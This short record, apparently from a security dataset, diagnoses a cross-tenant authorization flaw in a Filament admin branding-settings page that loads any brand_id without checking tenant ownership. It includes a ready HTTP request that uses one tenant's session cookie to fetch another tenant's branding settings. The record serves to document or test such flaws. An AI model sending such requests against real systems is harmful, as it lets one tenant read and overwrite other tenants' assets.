diagnosis: The Filament custom setting page accepts an arbitrary brand_id parameter in mount() and loads the BrandSetting model without confirming that the setting belongs to the authenticated tenant. An administrator can load and overwrite white-label styling assets and portal logos of other tenants on the shared cluster.
exploit_request:
GET /admin/manage-branding-settings?brand_id=14 HTTP/1.1
Host: app.whitelabel-crm.io
Cookie: filament_session=eyJhbGciOi...tenant11
Accept: text/html
